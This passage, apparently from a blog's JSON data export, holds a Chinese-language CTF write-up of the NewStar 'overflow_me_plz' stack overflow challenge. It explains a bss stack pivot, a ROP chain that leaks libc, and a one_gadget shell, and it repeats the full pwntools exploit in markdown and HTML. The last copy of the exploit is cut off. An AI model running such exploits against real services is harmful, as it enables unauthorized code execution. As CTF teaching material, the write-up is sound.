retn再次进行栈迁移，迁移到ROP链上。\n\n通过这次ROP可以leak libc，我们可以重复这个过程来get shell。\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='pwn'\nelf=ELF('./'+filename)\nlibc=ELF('libc-2.31.so')\n# p=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('node4.buuoj.cn',26999)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \npop_rdi_ret=0x0000000000400763\npop_rsi_r15_ret=0x0000000000400761\npop_rbp_ret=0x00000000004005b8\npop_r12_r13_r14_r15_ret=0x000000000040075c\nleave_ret=0x00000000004006f7\nread_addr=0x00000000004006D9\nbss_addr=elf.bss()+0x200\n\nru(\"Show me if you can pwn it!\\n\")\npayload=b'a'*0xc0+p64(bss_addr)+p64(read_addr)\n\ns(payload)\n\n# start from bss_addr-0xc0\npayload=p64(pop_rdi_ret)+p64(1)\npayload+=p64(pop_rsi_r15_ret)+p64(elf.got['read'])+p64(0)\npayload+=p64(elf.sym['write']) # leak libc\npayload+=p64(pop_rbp_ret) # try again to get shell\npayload+=p64(bss_addr+0x200)\npayload+=p64(read_addr)\npayload=payload.ljust(0xc0,b'a')\npayload+=p64(bss_addr-0xc0-0x8)+p64(leave_ret) # move to bss_addr-0xc0\nleak('bss_addr',hex(bss_addr))\n\n# debug()\ns(payload)  \n\nread_addr=uu64(ru('\\x7f')[1:])\nlibcbase=read_addr-libc.sym['read']\nleak('read_addr',hex(read_addr))\nleak('libcbase',hex(libcbase))\n\none_gadget=libcbase+0xe3afe\n\nr()\n# start from bss_addr+0x200-0xc0\npayload=p64(pop_r12_r13_r14_r15_ret)+p64(0)*4\npayload+=p64(one_gadget)\npayload=payload.ljust(0xc0,b'b')\npayload+=p64(bss_addr+0x200-0xc0-0x8)+p64(leave_ret) # move to bss_addr+0x200-0xc0\ns(payload)\n\nitr()\n\n# 0xe3afe execve(\"/bin/sh\", r15, r12)\n# constraints:\n#   [r15] == NULL || r15 == NULL\n#   [r12] == NULL || r12 == NULL\n\n# 0xe3b01 execve(\"/bin/sh\", r15, rdx)\n# constraints:\n#   [r15] == NULL || r15 == NULL\n#   [rdx] == NULL || rdx == NULL\n\n# 0xe3b04 execve(\"/bin/sh\", rsi, rdx)\n# constraints:\n#   [rsi] == NULL || rsi == NULL\n#   [rdx] == NULL || rdx == NULL\n\n```\n\n","slug":"NewStar-overflow_me_plz","published":1,"updated":"2023-03-19T02:44:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafg001p5oud0ctz4jt7","content":"<p>NewStar CTF Week5的题，利用没开PIE的程序的代码片段，多次使用栈迁移。</p>\n<span id=\"more\"></span>\n\n<p>查壳，就开了NX</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NewStar/overflow/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>逆向</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">192</span>]; <span class=\"comment\">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init(argc, argv, envp);</span><br><span class=\"line\">  write(<span class=\"number\">1</span>, <span class=\"string\">&quot;So this is not new and difficult for you anymore.\\n&quot;</span>, <span class=\"number\">0x33</span>uLL);</span><br><span class=\"line\">  write(<span class=\"number\">1</span>, <span class=\"string\">&quot;Show me if you can pwn it!\\n&quot;</span>, <span class=\"number\">0x1C</span>uLL);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0xD0</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>代码简单，是一个纯粹的栈溢出，只能溢出0x10，要通过栈迁移扩充空间，但我们没办法提前泄露栈地址，因此，我们只能迁移到bss段。</p>\n<p>通过栈溢出控制rbp后，利用read将数据读入到bss段。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00000000004006D9 48 8D 85 40 FF FF FF          lea     rax, [rbp+buf]\t\t\t\t  ;buf=-0xc0</span><br><span class=\"line\">.text:00000000004006E0 BA D0 00 00 00                mov     edx, 0D0h                       ; nbytes</span><br><span class=\"line\">.text:00000000004006E5 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class=\"line\">.text:00000000004006E8 BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class=\"line\">.text:00000000004006ED E8 3E FE FF FF                call    _read</span><br><span class=\"line\">.text:00000000004006ED</span><br><span class=\"line\">.text:00000000004006F2 B8 00 00 00 00                mov     eax, 0</span><br><span class=\"line\">.text:00000000004006F7 C9                            leave</span><br><span class=\"line\">.text:00000000004006F8 C3                            retn</span><br></pre></td></tr></table></figure>\n\n<p>read结束后，栈已经迁移到bss段上。在这次read写入的数据中布置好ROP链用于leak libc，并布置好rbp利用main的leave retn再次进行栈迁移，迁移到ROP链上。</p>\n<p>通过这次ROP可以leak libc，我们可以重复这个过程来get shell。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">26999</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x0000000000400763</span></span><br><span class=\"line\">pop_rsi_r15_ret=<span class=\"number\">0x0000000000400761</span></span><br><span class=\"line\">pop_rbp_ret=<span class=\"number\">0x00000000004005b8</span></span><br><span class=\"line\">pop_r12_r13_r14_r15_ret=<span class=\"number\">0x000000000040075c</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x00000000004006f7</span></span><br><span class=\"line\">read_addr=<span class=\"number\">0x00000000004006D9</span></span><br><span class=\"line\">bss_addr=elf.bss()+<span class=\"number\">0x200</span></span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Show me if you can pwn it!\\n&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0xc0</span>+p64(bss_addr)+p64(read_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># start from bss_addr-0xc0</span></span><br><span class=\"line\">payload=p64(pop_rdi_ret)+p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload+=p64(pop_rsi_r15_ret)+p64(elf.got[<span class=\"string\">&#x27;read&#x27;</span>])+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+=p64(elf.sym[<span class=\"string\">&#x27;write&#x27;</span>]) <span class=\"comment\"># leak libc</span></span><br><span class=\"line\">payload+=p64(pop_rbp_ret) <span class=\"comment\"># try again to get shell</span></span><br><span class=\"line\">payload+=p64(bss_addr+<span class=\"number\">0x200</span>)</span><br><span class=\"line\">payload+=p64(read_addr)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0xc0</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">payload+=p64(bss_addr-<span class=\"number\">0xc0</span>-<span class=\"number\">0x8</span>)+p64(leave_ret) <span class=\"comment\"># move to bss_addr-0xc0</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;bss_addr&#x27;</span>,<span class=\"built_in\">hex</span>(bss_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">s(payload)  </span><br><span class=\"line\"></span><br><span class=\"line\">read_addr=uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[<span class=\"number\">1</span>:])</span><br><span class=\"line\">libcbase=read_addr-libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;read_addr&#x27;</span>,<span class=\"built_in\">hex</span>(read_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget=libcbase+<span class=\"number\">0xe3afe</span></span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\"><span class=\"comment\"># start from bss_addr+0x200-0xc0</span></span><br><span class=\"line\">payload=p64(pop_r12_r13_r14_r15_ret)+p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span></span><br><span class=\"line\">payload+=p64(one_gadget)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0xc0</span>,<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">payload+=p64(bss_addr+<span class=\"number\">0x200</span>-<span class=\"number\">0xc0</span>-<span class=\"number\">0x8</span>)+p64(leave_ret) <span class=\"comment\"># move to bss_addr+0x200-0xc0</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [r15] == NULL || r15 == NULL</span></span><br><span class=\"line\"><span class=\"comment\">#   [r12] == NULL || r12 == NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [r15] == NULL || r15 == NULL</span></span><br><span class=\"line\"><span class=\"comment\">#   [rdx] == NULL || rdx == NULL</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [rsi] == NULL || rsi == NULL</span></span><br><span class=\"line\"><span class=\"comment\">#   [rdx] == NULL || rdx == NULL</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>NewStar CTF Week5的题，利用没开PIE的程序的代码片段，多次使用栈迁移。</p>","more":"<p>查壳，就开了NX</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NewStar/overflow/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n\n<p>逆向</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">192</span>]; <span class=\"comment\">// [rsp+0h] [rbp-C0h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  init(argc, argv, envp);</span><br><span class=\"line\">  write(<span class=\"number\">1</span>, <span class=\"string\">&quot;So this is not new and difficult for you anymore.\\n&quot;</span>, <span class=\"number\">0x33</span>uLL);</span><br><span class=\"line\">  write(<span class=\"number\">1</span>, <span class=\"string\">&quot;Show me if you can pwn it!\\n&quot;</span>, <span class=\"number\">0x1C</span>uLL);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0xD0</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>代码简单，是一个纯粹的栈溢出，只能溢出0x10，要通过栈迁移扩充空间，但我们没办法提前泄露栈地址，因此，我们只能迁移到bss段。</p>\n<p>通过栈溢出控制rbp后，利用read将数据读入到bss段。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00000000004006D9 48 8D 85 40 FF FF FF          lea     rax, [rbp+buf]\t\t\t\t  ;buf=-0xc0</span><br><span class=\"line\">.text:00000000004006E0 BA D0 00 00 00                mov     edx, 0D0h                       ; nbytes</span><br><span class=\"line\">.text:00000000004006E5 48 89 C6                      mov     rsi, rax                        ; buf</span><br><span class=\"line\">.text:00000000004006E8 BF 00 00 00 00                mov     edi, 0                          ; fd</span><br><span class=\"line\">.text:00000000004006ED E8 3E FE FF FF                call    _read</span><br><span class=\"line\">.text:00000000004006ED</span><br><span class=\"line\">.text:00000000004006F2 B8 00 00 00 00                mov     eax, 0</span><br><span class=\"line\">.text:00000000004006F7 C9                            leave</span><br><span class=\"line\">.text:00000000004006F8 C3                            retn</span><br></pre></td></tr></table></figure>\n\n<p>read结束后，栈已经迁移到bss段上。在这次read写入的数据中布置好ROP链用于leak libc，并布置好rbp利用main的leave retn再次进行栈迁移，迁移到ROP链上。</p>\n<p>通过这次ROP可以leak libc，我们可以重复这个过程来get shell。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">26999</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x0000000000400763</span></span><br><span class=\"line\">pop_rsi_r15_ret=<span class=\"number\">0x0000000000400761</span></span><br><span class=\"line\">pop_rbp_ret=<span class=\"number\">0x00000000004005b8</span></span><br><span class=\"line\">pop_r12_r13_r14_r15_ret=<span class=\"number\">0x000000000040075c</span></span><br><span class=\"line\">leave_ret=<span class=\"number\">0x00000000004006f7</span></span><br><span class=\"line\">read_addr=<span class=\"number\">0x00000000004006D9</span></span><br><span class=\"line\">bss_addr=elf.bss()+<span class=\"number\">0x200</span></span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Show me if you can pwn it!\\n&quot;</span>)</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0xc0</span>+p64(bss_addr)+p64(read_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># start from bss_addr-0xc0</span></span><br><span class=\"line\">payload=p64(pop_rdi_ret)+p64(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload+=p64(pop_rsi_r15_ret)+p64(elf.got[<span class=\"string\">&#x27;read&#x27;</span>])+p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload+=p64(elf.sym[<span class=\"string\">&#x27;write&#x27;</span>]) <span class=\"comment\"># leak libc</span></span><br><span class=\"line\">payload+=p64(pop_rbp_ret) <span class=\"comment\"># try again to get shell</span></span><br><span class=\"line\">payload+=p64(bss_addr+<span class=\"number\">0x200</span>)</span><br><span class=\"line\">payload+=p64(read_addr)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0xc0</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">payload+=p64(bss_addr-<span class=\"number\">0xc0</span>-<span class=\"number\">0x8</span>)+p64(leave_ret) <span class=\"comment\"># move to bss_addr-0xc0</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;bss_addr&#x27;</span>,<span class=\"built_in\">hex</span>(bss_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># debug()</span></span><br><span class=\"line\">s(payload)  </span><br><span class=\"line\"></span><br><span class=\"line\">read_addr=uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[<span class=\"number\">1</span>:])</span><br><span class=\"line\">libcbase=read_addr-libc.sym[<span class=\"string\">&#x27;read&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;read_addr&#x27;</span>,<span class=\"built_in\">hex</span>(read_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget=libcbase+<span class=\"number\">0xe3afe</span></span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\"><span class=\"comment\"># start from bss_addr+0x200-0xc0</span></span><br><span class=\"line\">payload=p64(pop_r12_r13_r14_r15_ret)+p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span></span><br><span class=\"line\">payload+=p64(one_gadget)</span><br><span class=\"line\">payload=payload.ljust(<span class=\"number\">0xc0</span>,<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">payload+=p64(bss_addr+<span class=\"number\">0x200</span>-<span class=\"number\">0xc0</span>-<span class=\"number\">0x8</span>)+p64(leave_ret) <span class=\"comment\"># move to bss_addr+0x200-0xc0</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class=\"line\"><span class=\"comment\"># constraints:</span></span><br><span class=\"line\"><span class=\"comment\">#   [r15] == NULL || r15 == NULL</span></span><br><span class=\"line\"><span class=\"comment\">#   [r12] == NULL || r12 